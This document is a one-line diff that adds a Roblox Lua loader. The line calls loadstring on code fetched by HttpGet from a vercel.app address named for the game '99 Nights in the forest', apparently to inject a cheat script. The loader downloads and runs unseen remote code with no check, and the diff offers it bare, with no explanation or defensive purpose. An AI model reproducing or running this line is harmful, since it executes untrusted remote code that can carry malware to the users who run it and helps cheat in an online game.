@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://testttt-seven-inky.vercel.app/api/raw/99_Nights_in_the_forestt"))()
